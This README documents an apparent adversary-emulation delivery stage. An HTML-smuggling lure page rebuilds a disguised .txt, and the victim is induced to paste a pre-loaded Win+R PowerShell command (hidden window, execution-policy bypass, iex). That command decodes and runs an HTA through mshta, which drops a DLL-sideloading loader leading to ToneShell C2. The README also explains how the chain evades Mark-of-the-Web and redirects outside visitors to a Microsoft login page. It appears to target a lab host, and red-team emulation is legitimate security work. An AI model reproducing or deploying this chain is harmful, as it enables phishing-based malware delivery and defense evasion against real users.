# html-smuggling-hta

Third delivery variant for q3-plan Phase 1 (Step 1C). Instead of downloading the
password-protected ZIP (Step 1) or retrieving it over BITS (Step 1B), the lure page
**smuggles an inert `.txt`**; the user pastes a Win+R command that has `powershell.exe`
recreate the HTA and run it with `mshta.exe`. The HTA drops the existing ToneShell
sideload loader (`EssosUpdate.exe` + `wsdapi.dll`), so the rest of the chain
(sideload -> sandbox checks -> `waitfor.exe` -> TONESHELL C2) is unchanged.

## Why a polyglot `.txt` (Mark-of-the-Web)

A file the browser downloads is tagged with Mark-of-the-Web (`Zone.Identifier`,
`ZoneId=3` -> Internet zone). An HTA opened from that file runs in the Internet zone,
where `ADODB.Stream.SaveToFile` is blocked ("Safety settings ... prohibit accessing a
data source on another domain"). This variant avoids that by never letting the browser
create the HTA:

- the browser only saves `Essos_Compliance_Update.txt` (inert);
- the user runs a `powershell.exe` one-liner (Win+R), and **PowerShell creates the HTA**
  -> the new file has no `Zone.Identifier` -> `mshta` runs it in the Local Machine zone
  -> `ADODB.Stream` works.

## Chain

```
[labuser CTRL+clicks the docx link]
        |
        v
[browser opens http://192.168.56.2:8080/staging.html]
        |
        v
[page reconstructs Essos_Compliance_Update.txt from an embedded base64 blob]
   - no HTTP GET for the .txt (T1027.006 HTML Smuggling)
        |
        v
[labuser pastes the pre-loaded Win+R command -> powershell.exe reads the .txt]
   - base64-decodes to %TEMP%\Essos_Compliance_Update.bin (T1140)
   - renames to %TEMP%\Essos_Compliance_Update.hta (T1036.008)
   - runs mshta.exe on it (T1218.005)
        |
        v
[HTA (no Mark-of-the-Web) writes EssosUpdate.exe + wsdapi.dll to %TEMP% (T1027.009)]
        |
        v
[ShellExecute %TEMP%\EssosUpdate.exe (hidden)]
        |
        v
[wsdapi.dll sideload -> existing Step 1 chain (sandbox checks, waitfor.exe, TONESHELL C2)]
```

## Files

| File | Role |
|------|------|
| `stage1.tpl.hta` | HTA **template** (`@@EXE_B64@@` / `@@DLL_B64@@` placeholders) |
| `staging.tpl.html` | Smuggling page **template** (`@@TXT_B64@@` placeholder) |
| `build.py` | Generates the runtime files below |
| `stage1.hta` | Generated HTA (embeds `EssosUpdate.exe` + `wsdapi.dll`) — committed |
| `Essos_Compliance_Update.txt` | Generated polyglot PEM/PowerShell (embeds `stage1.hta`) — committed |
| `staging.html` | Generated lure page (embeds the `.txt`) — committed, served by the operator |
| `make_iso.ps1` | **Unused** — kept from an abandoned ISO-packaging experiment |

`*.tpl.*` are the editable sources; never edit the generated files by hand — re-run `build.py`.

## Build

```bash
python build.py
```

Reads the loader from the ToneShell tree:

- `../../rce-and-c2/mustang-panda-emulation/toneshell-v2/EssosUpdate.exe` (112,984 bytes)
- `../../rce-and-c2/mustang-panda-emulation/toneshell-v2/build/src/wsdapi/Release/wsdapi.dll` (193,160 bytes)

Outputs:

- `stage1.hta` (~410 KB) — HTA with both loader binaries base64-embedded in hidden `<textarea>` elements
- `Essos_Compliance_Update.txt` (~556 KB) — polyglot PEM/PowerShell: base64 of `stage1.hta` inside a `<# ... #>` block comment (looks like a PEM certificate bundle) plus a PowerShell decoder line that reads the file back, base64-decodes it, renames `.bin` -> `.hta`, and runs `mshta.exe`
- `staging.html` (~753 KB) — page with the `.txt` base64-embedded in `var b64 = '...'`

The Win+R command (also printed by `build.py`):

```
powershell -w h -ep bypass -c "iex(gc -Raw '%USERPROFILE%\Downloads\Essos_Compliance_Update.txt')"
```

## Server requirements

Only `staging.html` is served, from the shared staging web server:

```
http://192.168.56.2:8080/staging.html
```

`Essos_Compliance_Update.txt` and `Essos_Compliance_Update.hta` are **not** hosted — they are reconstructed/created on the victim.

## Runtime notes

- The page only acts when `window.location.hostname === '192.168.56.2'`; any other hostname redirects to `https://login.microsoftonline.com/`.
- The page pre-loads the Win+R command into the clipboard when it reveals the UI; the user pastes it into Win+R.
- The HTA writes to `%TEMP%\EssosUpdate.exe` and `%TEMP%\wsdapi.dll` (same directory so the DLL search-order sideload resolves), then launches the loader hidden (`nShow=0`).
- `wsdapi.dll` validates its host process leaf name is `EssosUpdate.exe`; keep that name.

## Rebuild

After changing `stage1.tpl.hta` or `staging.tpl.html`, re-run `build.py` and re-serve `staging.html`.
